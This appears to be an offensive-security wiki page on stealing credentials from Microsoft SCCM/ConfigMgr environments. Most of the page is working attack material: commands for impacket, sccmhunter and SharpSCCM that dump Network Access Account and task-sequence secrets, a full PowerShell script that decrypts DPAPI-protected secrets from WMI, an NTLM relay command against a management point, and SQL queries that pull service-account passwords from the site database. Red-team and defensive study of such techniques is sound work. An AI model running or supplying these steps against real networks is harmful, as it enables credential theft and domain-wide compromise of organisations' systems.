---
title: SCCM Credentials
---

[[notes/mitre-attack/credential-access]] on [[notes/ad/sccm]]-managed computers.

The Network Access Account (NAA) is a domain account that not yet domain-joined SCCM computers use to retrieve data from SCCM.
Therefore every computer knows its password.
Credentials of current and previous NAAs can be found on disk, even after SCCM was migrated from NAA to Enhanced HTTP.

Furthermore Task Sequences nearly always contain credentials of a "domain joiner account" which is often owner of all computers it ever joined to the domain.

# From client

Dump the NAA credentials remotely as local admin.

=== "[[notes/tools/impacket]]"
    Requires [PR 1137](https://github.com/fortra/impacket/pull/1137).

    ~~~ bash
    impacket-systemdpapidump -sccm corp.local/jdoeadm:'passw0rd'@ws01.corp.local
    ~~~

=== "[[notes/tools/sccmhunter]]"
    ~~~ bash
    sccmhunter dpapi -d corp.local -u jdoeadm -p 'passw0rd' -target ws01.corp.local
    ~~~

    [source](https://twitter.com/s1zzzz/status/1731500405316538805)

Dump NAA credentials, Task Sequences and Collection Variables locally as local admin.

=== "builtin"
    Extract the encrypted password blobs of current and previous NAAs by searching for `PolicySecret` in `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`.
    The file is world-readable, but decryption requires system context.

    Instead of parsing `OBJECTS.DATA` the current blobs can be retrieved from WMI as well.

    ~~~ powershell
    Add-Type -AssemblyName System.Security

    function Decrypt($hexblob) {
        $byteblob = New-Object -TypeName byte[] -ArgumentList ($hexblob.Length / 2)
        for ($i = 0; $i -lt $hexblob.Length; $i += 2) {
            $byteblob[$i / 2] = [System.Convert]::ToByte($hexblob.Substring($i, 2), 16)
        }
        [System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($byteblob[4..$byteblob.Length], $null, 'LocalMachine'))
    }

    function ExtractSecret($text) {
        ([xml] $text).PolicySecret.InnerText
    }

    echo 'Network Access Account:'
    $naa = Get-WMIObject -Namespace 'root\ccm\Policy\Machine\ActualConfig' -ClassName CCM_NetworkAccessAccount
    Decrypt(ExtractSecret($naa.NetworkAccessUsername))
    Decrypt(ExtractSecret($naa.NetworkAccessPassword))

    echo 'Task Sequences:'
    $ts = Get-WMIObject -Namespace 'root\ccm\Policy\Machine\ActualConfig' -ClassName CCM_TaskSequence
    Decrypt(ExtractSecret($ts.TS_Sequence))

    echo 'Collection Variables:'
    $cv = Get-WMIObject -Namespace 'root\ccm\Policy\Machine\ActualConfig' -ClassName CCM_CollectionVariable
    # check manually
    ~~~

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe local secrets -m disk
    .\SharpSCCM.exe local secrets -m wmi
    ~~~

Search for [[notes/windows/sensitive-files]] under `C:\Windows\CCM\ScriptStore` as system ([source](http://web.archive.org/web/20240213175832/https://http418infosec.com/offensive-sccm-summary)).

References:

- [The phantom credentials of SCCM: Why the NAA won't die](http://web.archive.org/web/20221129092818/https://scribe.rip/@specterops/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)

# From SCCM server

Retrieve NAA credentials from SCCM if you control a [[notes/ad/domain-computer|computer account]].

=== "[[notes/tools/sccmhunter]]"
    ~~~ bash
    sccmhunter http -debug -d corp.local -u jdoe -p 'passw0rd' -cn 'hackerpc$' -cp 'passw0rd' -dc-ip dc01.corp.local
    ~~~

=== "[[notes/tools/sharpsccm]]"
    Retrieve encoded secrets.

    ~~~ bat
    .\SharpSCCM.exe get secrets -mp sccmmp01.corp.local -sc CRP --username hackerpc$ --password 'passw0rd' -r hackerdevice1
    ~~~

    Decode hex strings printed by the previous command.

    ~~~ bat
    .\DeobfuscateSecretString.exe $hexsecret
    ~~~

    Both commands can be execute on a non-joined computer.

Retrieve NAA credentials from SCCM by [[notes/ad/ntlm-relay-from-smb|coercing a computer over SMB]] and relaying it to the SSCM server.

=== "[[notes/tools/impacket]]"
    Requires [PR 1425](https://github.com/fortra/impacket/pull/1425).

    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support --sccm --sccm-sleep 10 --sccm-fqdn sccmmp01.corp.local --sccm-server sccmmp01 --sccm-device hackerdevice1 -t http://sccmmp01.corp.local/ccm_system_windowsauth/request
    ~~~

    Use `DeobfuscateSecretString.exe` from SharpSCCM to decode the `naapolicy.xml`.

Other tools:

- [sccmwtf](https://github.com/xpn/sccmwtf), used internally by [[notes/tools/sccmhunter]]

References:

- [Exploring SCCM by unobfuscating Network Access Accounts](http://web.archive.org/web/20221022212714/https://blog.xpnsec.com/unobfuscating-network-access-accounts/)

# On management point

Extract credentials from WMI store as local admin ([source](http://web.archive.org/web/20240304065542/https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/)).

~~~ powershell
Get-WmiObject -Class SMS_SCI_Reserved -Namespace ROOT\SMS\site_CRP
~~~

# On site database

Dump task sequences from the site database and decode them with `DeobfuscateSecretString.exe` ([source](http://web.archive.org/web/20240213175832/https://http418infosec.com/offensive-sccm-summary)).

~~~ sql
USE CM_CRP;
SELECT Name, Sequence FROM vSMS_TaskSequencePackage;
SELECT Name, Sequence FROM vSMS_TaskSequencePackageEx;
SELECT Name, Sequence FROM TS_TaskSequence;
~~~

Dump DPAPI-encrypted credentials of SCCM service accounts from the site database and decrypt them with [sccmdecryptpoc.cs](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1) on the server that has the SMS Provider role which is typically the primary site server ([source](https://twitter.com/_xpn_/status/1543682652066258946), [source](https://twitter.com/theluemmel/status/1693629416528572430)).

~~~ sql
USE CM_CRP;
SELECT UserName, Password FROM SC_UserAccount;
~~~
